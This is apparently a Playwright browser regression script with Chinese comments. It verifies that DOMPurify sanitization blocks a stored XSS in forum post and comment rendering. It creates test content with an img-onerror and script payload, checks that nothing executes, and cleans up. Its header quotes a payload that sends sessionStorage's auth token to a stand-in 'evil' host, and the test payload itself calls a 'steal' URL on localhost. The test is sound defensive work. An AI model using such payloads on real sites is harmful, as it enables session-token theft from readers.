/**
 * 富文本净化的浏览器回归验证（第 91 批）
 * ------------------------------------------------------------------
 * 背景：第 91 批修掉一个**存储型 XSS** —— 论坛帖子正文、评论、回复都是用户写的内容，
 * 却被直接塞进 `v-html`（PostDetailView 模板 88/247/379 行），中间只有一个
 * `\n → <br>` 的替换，没有任何净化。于是：
 *
 *     一条内容为 <img src=x onerror="fetch('//evil/'+sessionStorage.auth_token)"> 的帖子，
 *     会在**每个读者**的浏览器里执行，而 token 正好就存在 sessionStorage 里。
 *
 * 修法：新增 `src/utils/richText.js`（DOMPurify），帖子 / 评论 / 审核预览 / 新闻正文
 * 四条 v-html 链路统一走它。**后端测试跑不到 DOM**，所以这条链路必须用浏览器验证 ——
 * 本脚本就是那个验证，而且是可重复执行的（不像手工点一遍就没了）。
 *
 * 做法：
 *   1. 用真实后端 API 登录，建一条正文带 payload 的帖子 + 一条同样带 payload 的评论；
 *   2. 在 Chromium 里打开该帖详情页（注入 token 到 sessionStorage，模拟已登录）；
 *   3. 断言三件事 —— 脚本没执行、`onerror` 属性被清除、`<script>` 没进 DOM；
 *      同时断言正常段落仍在（净化不能把内容也吃掉）；
 *   4. 无论成败都删掉验证帖（评论随帖级联删除），不留垃圾数据。
 *
 * 用法：
 *   npm run verify:xss                       # 用默认账号（i18n 审计夹具）与默认地址
 *   I18N_AUDIT_BASE_URL=... I18N_AUDIT_API_URL=... npm run verify:xss
 *
 * 前置：后端 8000 + 前端 5173 已启动；审计夹具账号存在（见 backend/_seed_i18n_audit_tmp.py）。
 */
import { chromium, request as playwrightRequest } from '@playwright/test';

const BASE_URL = process.env.I18N_AUDIT_BASE_URL || 'http://127.0.0.1:5173';
const API_URL = process.env.I18N_AUDIT_API_URL || 'http://127.0.0.1:8000';
const USER = process.env.XSS_VERIFY_USER || 'zz_i18n_audit';
const PASSWORD = process.env.XSS_VERIFY_PASSWORD || 'ZzI18nAudit!2026';
const SHOT_PATH = process.env.XSS_VERIFY_SHOT || 'dsh-shots/verify-xss-sanitize.png';

const log = (...args) => console.log(...args);

/**
 * payload：两件事都要能证明 —— 能执行 JS、能读到 sessionStorage 里的 token。
 * `onerror` 里刻意只做"置哨兵 + 打一个必然失败的本地端口"，不真的外发数据。
 */
const PAYLOAD =
  '<img src=x onerror="window.__XSS_EXECUTED=true;'
  + "fetch('http://127.0.0.1:9/steal?t='+encodeURIComponent(sessionStorage.getItem('auth_token')||''));\">"
  + '<script>window.__XSS_PARENT_SCRIPT=true<\/script>'
  + '<p>正文里的正常段落</p>';

async function main() {
  const api = await playwrightRequest.newContext({ baseURL: API_URL });

  // ── 1) 登录 ───────────────────────────────────────────────────────────────
  const loginResp = await api.post('/api/login/', { data: { username: USER, password: PASSWORD } });
  if (!loginResp.ok()) {
    throw new Error(`登录失败 ${loginResp.status()}：${(await loginResp.text()).slice(0, 200)}`);
  }
  const loginBody = await loginResp.json();
  const token = loginBody?.data?.token;
  const me = loginBody?.data?.user;
  if (!token) throw new Error(`登录响应没有 token：${JSON.stringify(loginBody).slice(0, 200)}`);
  log(`✓ 已登录：${me.username}（role=${me.role}）`);

  // ── 2) 造带 payload 的帖子与评论 ──────────────────────────────────────────
  const createResp = await api.post('/api/forums/posts/', {
    headers: { Authorization: `Token ${token}` },
    data: {
      title: `[XSS 验证] 净化回归 ${Date.now()}`,
      content: PAYLOAD,
      board_id: Number(process.env.XSS_VERIFY_BOARD || 1),
    },
  });
  if (!createResp.ok()) {
    throw new Error(`建帖失败 ${createResp.status()}：${(await createResp.text()).slice(0, 300)}`);
  }
  const post = await createResp.json();
  const postId = post.id;
  log(`✓ 已建帖 id=${postId} status=${post.status}（正文含 <img onerror> 与 <script>）`);

  // 评论走的是另一条 v-html 链路（formatCommentContent），必须单独验
  const commentResp = await api.post(`/api/forums/posts/${postId}/comments/`, {
    headers: { Authorization: `Token ${token}` },
    data: { content: PAYLOAD },
  });
  let commentId = null;
  if (commentResp.ok()) {
    commentId = (await commentResp.json()).id;
    log(`✓ 已建评论 id=${commentId}（同样带 payload）`);
  } else {
    log(`⚠ 建评论失败 ${commentResp.status()}：${(await commentResp.text()).slice(0, 200)}`);
  }

  // ── 3) 打开详情页，检查脚本有没有被执行 ───────────────────────────────────
  const browser = await chromium.launch();
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  await context.addInitScript(({ tk, user }) => {
    window.sessionStorage.setItem('auth_token', tk);
    window.sessionStorage.setItem('user', JSON.stringify(user));
    window.__XSS_EXECUTED = false;  // 哨兵：payload 一执行就会变成 true
  }, { tk: token, user: me });

  const page = await context.newPage();
  const consoleErrors = [];
  page.on('pageerror', (err) => consoleErrors.push(err.message.split('\n')[0]));

  await page.goto(`${BASE_URL}/forum/post/${postId}`, { waitUntil: 'domcontentloaded' });
  await page.waitForSelector('.post-content', { timeout: 20_000 });
  await page.waitForTimeout(1200);

  try {
    await page.screenshot({ path: SHOT_PATH, fullPage: false });
  } catch {
    /* 截图失败不影响判定 */
  }

  const result = await page.evaluate(() => {
    const box = document.querySelector('.post-content');
    const commentBox = document.querySelector('.comment-content');
    return {
      executed: window.__XSS_EXECUTED === true,
      parentScriptFlag: window.__XSS_PARENT_SCRIPT === true,
      innerHTML: box ? box.innerHTML : null,
      text: box ? box.innerText : null,
      hasOnerrorAttr: box ? box.innerHTML.includes('onerror') : null,
      hasScriptTag: box ? box.querySelectorAll('script').length : null,
      hasImg: box ? box.querySelectorAll('img').length : null,
      commentFound: Boolean(commentBox),
      commentInnerHTML: commentBox ? commentBox.innerHTML : null,
      commentHasOnerror: commentBox ? commentBox.innerHTML.includes('onerror') : null,
      commentHasScript: commentBox ? commentBox.querySelectorAll('script').length : null,
    };
  });

  log('\n── 详情页检查结果 ─────────────────────────────');
  log('注入脚本是否执行        :', result.executed ? '❌ 执行了（未修复）' : '✅ 没有执行');
  log('帖子内 <script> 残留    :', result.hasScriptTag, '个');
  log('帖子内 onerror 残留     :', result.hasOnerrorAttr ? '❌ 还在' : '✅ 已被清除');
  log('帖子 <img> 渲染数量     :', result.hasImg, '个');
  log('正文里保留的正常文字    :', JSON.stringify((result.text || '').trim()));
  log('帖子净化后 innerHTML    :', JSON.stringify((result.innerHTML || '').slice(0, 220)));
  log('--- 评论（另一条 v-html 链路）---');
  log('是否渲染出评论          :', result.commentFound ? '是' : '否（没有评论可检查）');
  log('评论内 <script> 残留    :', result.commentHasScript, '个');
  log('评论内 onerror 残留     :', result.commentHasOnerror ? '❌ 还在' : '✅ 已被清除');
  log('评论净化后 innerHTML    :', JSON.stringify((result.commentInnerHTML || '').slice(0, 220)));
  log('页面 JS 报错            :', consoleErrors.length ? consoleErrors : '无');
  if (result.executed) log('⚠ 父页面 script 标记    :', result.parentScriptFlag);
  log('截图                    :', SHOT_PATH);

  // ── 4) 清理 ───────────────────────────────────────────────────────────────
  const delResp = await api.delete(`/api/forums/posts/${postId}/`, {
    headers: { Authorization: `Token ${token}` },
  });
  log(`\n清理：删除验证帖 → HTTP ${delResp.status()}${commentId ? `（评论 ${commentId} 随帖级联删除）` : ''}`);

  await browser.close();
  await api.dispose();

  const ok = result.executed === false
    && result.parentScriptFlag === false
    && result.hasOnerrorAttr === false
    && (result.hasScriptTag || 0) === 0
    && result.commentHasOnerror === false
    && (result.commentHasScript || 0) === 0;

  log(ok
    ? '\n结论：✅ 净化生效（帖子与评论的脚本都未执行、事件属性与 <script> 均被清除）'
    : '\n结论：❌ 仍未防住，需要继续排查');
  process.exit(ok ? 0 : 1);
}

main().catch((err) => {
  console.error('脚本自身出错：', err?.stack || String(err));
  process.exit(2);
});
